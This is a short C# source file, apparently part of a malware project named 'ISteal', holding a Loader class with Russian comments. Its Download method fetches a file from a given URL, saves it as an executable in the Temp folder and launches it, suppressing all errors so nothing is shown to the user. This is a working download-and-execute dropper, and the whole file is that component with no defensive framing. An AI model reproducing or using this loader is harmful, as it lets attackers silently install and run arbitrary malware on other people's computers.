using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace ISteal.Function
{
    internal class Loader
    {
        public static void Download(string url, string filename)
        {
            byte[] srv = null;
            try
            {
                using (WebClient web = new WebClient())
                {
                    srv = web.DownloadData(url); // скачиваем файл
                }
            }
            catch (WebException) { }
            catch (NotSupportedException) { }
            try
            {
                File.WriteAllBytes(Path.GetTempPath() + "\\" + filename + ".exe", srv); // записываем в Temp
            }
            catch (Exception) { }
            try
            {
                Process.Start(Path.GetTempPath() + "\\" + filename + ".exe"); // запускаем
            }
            catch (FileNotFoundException) { }
            catch (Win32Exception) { }
        }
    }
}